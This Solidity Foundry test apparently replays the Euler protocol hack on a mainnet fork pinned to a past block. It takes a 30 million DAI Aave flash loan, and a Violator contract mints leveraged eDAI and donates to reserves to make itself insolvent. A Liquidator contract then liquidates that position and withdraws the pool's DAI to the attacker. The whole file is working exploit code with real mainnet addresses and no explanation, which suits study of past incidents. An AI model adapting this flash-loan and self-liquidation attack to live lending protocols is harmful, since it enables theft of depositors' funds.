// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/interfaces/ITokens.sol";
import {IERC20, IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract EulerHackTest is Test {
    IERC20Metadata DAI = IERC20Metadata(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    Violator violator;
    Liquidator liquidator;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_817_995);
        vm.label(address(DAI), "DAI");
        vm.label(address(eDAI), "eDAI");
        vm.label(address(dDAI), "dDAI");
        vm.label(address(Euler), "Euler");
        vm.label(address(AaveV2), "AaveV2");
    }

    function testExploit() public {
        uint256 aaveFlashLoanAmount = 30_000_000 ether;
        address[] memory assets = new address[](1);
        assets[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveFlashLoanAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        bytes memory params =
            abi.encode(30_000_000, 200_000_000, 100_000_000, 44_000_000, address(DAI), address(eDAI), address(dDAI));
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);

        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
    }

    // hook function for aave flashloan
    function executeOperation(
        address[] calldata, /*assets*/
        uint256[] calldata, /*amounts*/
        uint256[] calldata, /*premiums*/
        address, /*initator*/
        bytes calldata /*params*/
    ) external returns (bool) {
        DAI.approve(address(AaveV2), type(uint256).max);
        violator = new Violator();
        liquidator = new Liquidator();
        DAI.transfer(address(violator), DAI.balanceOf(address(this)));
        violator.violator();
        liquidator.liquidate(address(liquidator), address(violator));
        return true;
    }
}

contract Violator {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function violator() external {
        DAI.approve(Euler_Protocol, type(uint256).max);
        eDAI.deposit(0, 20_000_000 ether);
        eDAI.mint(0, 200_000_000 ether);
        dDAI.repay(0, 10_000_000 ether);
        eDAI.mint(0, 200_000_000 ether);
        eDAI.donateToReserves(0, 100_000_000 ether);
    }
}

contract Liquidator {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function liquidate(address _liquidator, address _violator) external {
        IEuler.LiquidationOpportunity memory returnData =
            Euler.checkLiquidation(_liquidator, _violator, address(DAI), address(DAI));
        Euler.liquidate(_violator, address(DAI), address(DAI), returnData.repay, returnData.yield);
        eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}
